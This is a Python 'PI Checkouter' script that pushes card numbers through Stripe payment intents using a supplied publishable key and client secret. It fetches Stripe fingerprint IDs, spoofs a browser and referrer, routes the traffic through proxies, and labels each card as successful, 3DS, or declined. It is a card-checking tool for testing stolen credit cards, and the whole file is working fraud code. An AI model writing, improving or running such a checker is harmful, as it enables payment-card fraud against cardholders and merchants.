import requests

r = requests.Session()

combined_proxy = "replace proxy here"
components = combined_proxy.split(':')
username = components[1]
password = components[2]
proxy = components[0]
proxy_auth = "{}:{}@{}".format(username, password, proxy)
proxies = {
    "http": combined_proxy.format(proxy_auth)
}

def pistuff(cc, mes, ano, cvv, pk, secretpi):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "/"
    }

    response = r.post("https://m.stripe.com/6", headers=headers, proxies=proxies)
    json_data = response.json()
    m = json_data.get("muid")
    s = json_data.get("sid")
    g = json_data.get("guid")

    index = secretpi.find('_secret_')
    if index != -1:
        pi = secretpi[:index]
    else:
        print("Secret key not found in response.")

    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=skibidi+sigma+csub&payment_method_data[card][number]={cc}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={g}&payment_method_data[muid]={m}&payment_method_data[sid]={s}&payment_method_data[pasted_fields]=number&payment_method_data[referrer]=https%3A%2F%2Froblox.com&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&client_secret={secretpi}'
    response = r.post(f'https://api.stripe.com/v1/payment_intents/{pi}/confirm', headers=headers, data=data, proxies=proxies)

    response_json = response.json()
    code = response_json.get("error", {}).get("code")
    decline_code = response_json.get("error", {}).get("decline_code")
    message = response_json.get("error", {}).get("message")

    if '"status": "succeeded"' in response.text:
        return f"\n✫PI Checkouter✫\nCC -» {cc}|{mes}|{ano}|{cvv}\nResponse -» Payment successful"
    elif "requires_source_action" in response.text or "intent_confirmation_challenge" in response.text or "requires_action" in response.text:
        return f"\n✫PI Checkouter✫\nCC -» {cc}|{mes}|{ano}|{cvv}\nResponse -» Declined\nStatus -» 3DS CARD"
    else:
        return f"\n✫PI Checkouter✫\nCC -» {cc}|{mes}|{ano}|{cvv}\nResponse -» Declined\nStatus -» {code} | {decline_code} | {message}"

print("""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣠⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠴⠒⠒⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠉⠑⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡶⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣾⣿⡷⢤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣶⡿⠋⠀⠀⠀⠀⠀⠀⣀⣀⣀⣠⣤⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢻⣦⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠀⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠈⣿⣷⣄⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⠁⠈⢻⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠉⠁⠀⠀⠀⠀⠀⠈⠻⣿⣿⡿⠋
⠀⠀⠀⠀⣰⣿⣿⣧⡀⠀⢹⠀⢸⠋⠉⠉⠉⠙⠛⠿⢿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡟⠀⠀
⠀⠀⢀⣴⣿⣿⠟⠁⠱⡄⠸⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀
⣴⣾⣿⣿⡿⠁⠀⠀⠀⠈⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀
⠈⠙⠻⣿⡇⠀⠀⠀⠀⠀⠀⡄⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀
⠀⠀⠀⡈⠻⣆⠀⠀⠀⠀⠀⠘⡄⠘⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠣⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀
⠀⠀⠀⠘⣄⠈⠳⣄⠀⠀⠀⠀⠘⠄⠡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⡄⠀⠘⢧⡀⠀⠀⠀⠈⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢷⠀⠀⠀⠹⣆⠀⠀⠀⠙⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠘⢧⡀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠻⣄⠀⢸⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣧⠀⠀⡆⠀⠀⠀⠘⢆⡎⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⠀⠀⢹⠀⠀⠀⠀⠈⠃⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⠀⠀⢸⡀⠀⠀⠀⠈⢄⠀⠘⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠸⡇⠀⠈⡇⠀⠀⠀⠀⠈⢢⡀⠀⠀⡈⠙⠲⠦⢤⣀⠀⠀⠐⠚⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⡀⢀⣿⠀⠀⠀⠀⠀⠀⠙⠦⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  \n""")
card_details = input("ᴄᴄ -» ").split("|")
cc, mes, ano, cvv = card_details
pk = input("ᴘᴋ -» ")
secretpi = input("ᴄꜱ -» ")
result = pistuff(cc, mes, ano, cvv, pk, secretpi)
print(result)
